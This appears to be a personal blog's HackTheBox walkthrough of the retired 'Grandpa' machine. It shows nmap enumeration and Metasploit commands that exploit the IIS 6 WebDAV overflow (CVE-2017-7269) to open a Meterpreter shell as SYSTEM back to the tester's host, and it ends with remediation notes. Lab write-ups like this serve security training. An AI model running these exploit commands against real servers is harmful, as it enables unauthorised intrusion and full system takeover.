@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HTB Grandpa: IIS 6 WebDAV overflow straight to SYSTEM — Lucky Thandel</title>
+<meta name="description" content="Windows Server 2003, one ancient web server, one public buffer overflow (CVE-2017-7269): from IIS version string to SYSTEM in a single exploit. By Lucky Thandel.">
+<link rel="stylesheet" href="../../assets/css/style.css">
+</head>
+<body>
+<canvas id="matrix"></canvas>
+<div class="wrap">
+<nav class="nav">
+  <a class="logo" href="../../">lucky@thandel:~<span class="cursor">▊</span></a>
+  <a class="link" href="../../">./home</a>
+  <a class="link active" href="../">./articles</a>
+  <a class="link" href="../../about/">./about</a>
+  <a class="link" href="../../contact/">./contact</a>
+</nav>
+
+<div class="meta">2026-10-08 · retired-machine · by Lucky Thandel</div>
+<h1>HTB Grandpa: IIS 6 WebDAV overflow straight to SYSTEM</h1>
+<div><span class="tag">retired-machine</span><span class="tag">easy</span></div>
+
+<div class="article-body">
+<p>Grandpa is a retired HackTheBox easy Windows machine that teaches version-driven exploitation at its purest. Synopsis: Microsoft IIS 6.0 on Windows Server 2003, one public buffer overflow (CVE-2017-7269), from version string to SYSTEM in a single exploit.</p>
+<h2><span class="amber">$</span> Enumeration — Nmap</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># nmap: confirm IIS 6.0 on 2003</span>
+nmap -sC -sV -oN grandpa.nmap 10.10.10.14</pre>
+<p>IIS 6.0 on Server 2003 with WebDAV enabled. Confirm the version, match the CVE, exploit — a stack this old has a flagship public exploit as curriculum.</p>
+<h2><span class="amber">$</span> Exploitation — WebDAV overflow (CVE-2017-7269)</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># msfconsole: webdav_scstoragepathfromurl</span>
+msfconsole -q
+msf6 &gt; use exploit/windows/iis/iis_webdav_scstoragepathfromurl
+msf6 exploit(iis_webdav_scstoragepathfromurl) &gt; set RHOSTS 10.10.10.14
+msf6 exploit(iis_webdav_scstoragepathfromurl) &gt; set LHOST 10.10.14.23
+msf6 exploit(iis_webdav_scstoragepathfromurl) &gt; run
+[*] Meterpreter session 1 opened as NT AUTHORITY\SYSTEM</pre>
+<p>A crafted PROPFIND/PROPPATCH with an overlong If header overflows ScStoragePathFromUrl and hijacks execution. The IIS worker context yields SYSTEM directly — user.txt and root.txt both fall in the single session. Flag values redacted per HTB rules; earn them in your own lab.</p>
+<h2><span class="amber">$</span> Dead ends</h2>
+<p>Fuzzing the website for injection first (the site is static decoration — the service version is the vulnerability) and doubting a 2017 CVE on a 2003 box (unpatched legacy is exactly where old exploits live forever).</p>
+<h2><span class="amber">$</span> Remediation notes</h2>
+<p>Retire Server 2003 and IIS 6 entirely, disable WebDAV where unused, and treat any IIS 6 banner on a scan as a critical finding on sight. Written by Lucky Thandel.</p>
+</div>
+
+<div class="byline">Written by <strong>Lucky Thandel</strong> · HTB walkthrough series · retired machines only — no spoilers for active boxes.</div>
+<p><a class="btn" href="../">← $ cd ../articles</a></p>
+
+<footer>
+  <span>© 2026 Lucky Thandel · written by Lucky Thandel</span>
+  <span>session <span id="session-clock">00:00:00</span> · <a href="../../contact/">contact</a></span>
+</footer>
+</div>
+<script src="../../assets/js/terminal.js"></script>
+</body>
+</html>
